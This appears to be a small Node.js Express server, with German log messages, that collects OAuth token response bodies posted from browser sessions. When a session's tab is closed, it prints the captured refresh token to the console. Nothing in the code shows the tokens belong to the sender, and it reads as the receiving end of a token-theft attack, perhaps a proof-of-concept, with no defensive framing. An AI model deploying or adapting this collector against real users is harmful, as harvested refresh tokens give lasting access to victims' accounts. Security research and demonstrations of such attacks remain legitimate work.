const express = require('express');
const bodyParser = require('body-parser');
const app = express();
const port = 9999;

const tokenRequestsPerSession = {};

app.use(bodyParser.json());
app.use(bodyParser.text());
app.use(express.static('public'));

function logWithTimestamp(sessionId, ...messages) {
    const timestamp = new Date().toLocaleTimeString();
    console.log(`${timestamp} [${sessionId}] -`, ...messages);
}

app.post('/rest/receive-token-body', (req, res) => {
    const { sessionId, body } = req.body;
    tokenRequestsPerSession[sessionId] = body;

    logWithTimestamp(sessionId, 'Empfangener Token-Body');
    res.status(200).send();
});

app.post('/rest/tab-closed', (req, res) => {
    const sessionId = req.body;
    logWithTimestamp(sessionId, 'Tab oder Browser wurde geschlossen.');
    logWithTimestamp(sessionId, `Refresh Token: ${tokenRequestsPerSession[sessionId].refresh_token}`);
});

app.listen(port, () => {
    console.log(`Server läuft unter http://localhost:${port}`);
});